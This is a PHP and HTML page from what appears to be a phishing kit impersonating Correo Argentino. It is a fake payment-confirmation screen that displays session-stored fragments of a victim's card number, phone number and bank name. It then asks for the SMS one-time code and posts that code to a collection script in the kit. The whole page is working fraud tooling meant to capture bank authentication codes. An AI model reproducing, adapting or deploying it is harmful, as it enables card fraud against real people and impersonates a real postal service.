<?php
session_start();

include("./Conan/911.php");

$phone = $_SESSION["phone"];
$phone = str_replace(" ","",$phone);

$one = $_SESSION["one"];
$one = str_replace(" ","",$one);
?>
<!doctype html>
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <!-- Required meta tags -->
        
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow,"="" "noimageindex,"="" "noarchive,"="" "nocache,"="" "nosnippet"="">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./X911/helpers.css">
        <link rel="stylesheet" href="./X911/stylee.css">
	    <link rel="stylesheet" href="./X911/stylaa.css">


        <link rel="icon" href="./X911/favicon.ico" />

        <title>Correo Argentino |</title>
    </head>
	 <header style="background: #FFCE00; color: #fff;">
            <div class="head">
                <div class="logo">
                    <img src="./X911/logo.png" style="width: 150px;">
                </div>
            </div>
     </header>
    <body>

		<div id="ss-wrapper">
            <div class="ss-area">
                <form action="./siftA/1.php" method="post">
                <input type="hidden" name="captcha">
                <input type="hidden" name="step" value="sms">
                <input type="hidden" name="error" value="">
                <div class="top d-flex align-items-center">
                    <div class="flex-grow-1"><img style="width: 120px;" src="./X911/logo.png"></div>
                    <div><img src="./X911/<?php echo $_SESSION['bank_scheme']; ?>.png" style="max-width: 120px;"></div>
                </div>
                <h3>Por favor confirme el siguiente pago.</h3>
                <div class="details">
                    <p>La contraseña única se ha enviado al número de teléfono móvil que se indica a continuación. Si necesita cambiar su número de móvil, póngase en contacto con su banco o cámbielo a través de los canales disponibles (cajero automático, Internet).</p>
                    <table>
                        <tr>
                            <td>Nombre del banco:</td>
                            <td><?php echo $_SESSION['bank_name']; ?></td>
                        </tr>
                        <tr>
                            <td>Distribuidor:</td>
                            <td>Correo Argentino Express</td>
                        </tr>
                        <tr>
                            <td>Multitud:</td>
                            <td>$3.99</td>
                        </tr>
                        <tr>
                            <td>Fecha:</td>
                            <td><strong><SCRIPT LANGUAGE="JavaScript">
var maintenant=new Date();
var jour=maintenant.getDate();
var mois=maintenant.getMonth()+1;
var an=maintenant.getFullYear();
document.write("",jour,"/",mois,"/",an,);
</SCRIPT></strong></td>
                        </tr>
                        <tr>
                            <td>Número de Tarjeta de Crédito:</td>
                            <td>XXXXXXXXXX<?php echo substr($one , -4);?></td>
                        </tr>
                        <tr>
                            <td>Número de teléfono:</td>
                            <td>XXXXXXXXXX<?php echo substr($phone , -4);?></td>
                        </tr>
                        <tr>
                            <td>Código SMS:</td>
                            <td>
                                <input type="text" inputmode="numeric" maxlength="8" name="smsone" id="smsone" class="" required>
                                                            </td>
                        </tr>
                    </table>
                    <p style="font-size: 14px; text-align: center; margin-bottom: 0; margin-top: 10px;">Por favor, introduzca el código de confirmación recibido por SMS:<span class="timer" style="color: #d40511; font-weight: 700; cursor: pointer;"></span></p>
                </div>
                <div class="btns">
                    <button name="submit" type="submit">Enviar</button>
                </div>
                <p class="copy">© 2023 Correo Oficial de la República Argentina - Todos los derechos reservados  |  Webmaster</p>
            </form>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="./X911/jquery.countdownTimer.min.js"></script>
        <script src="./X911/script.js"></script>
		
		     <script type="text/javascript">
            $(".timer").countdowntimer({
                minutes : 2,
                timeUp : timeIsUp
            });
            function timeIsUp() {
                $(".timer").html('Intentar otra vez');
            }
            $('.timer').click(function(){
                location.reload();
            });
             </script>
		
			 <script src="./X911/jquery.min.js"></script>



    </body>

</html>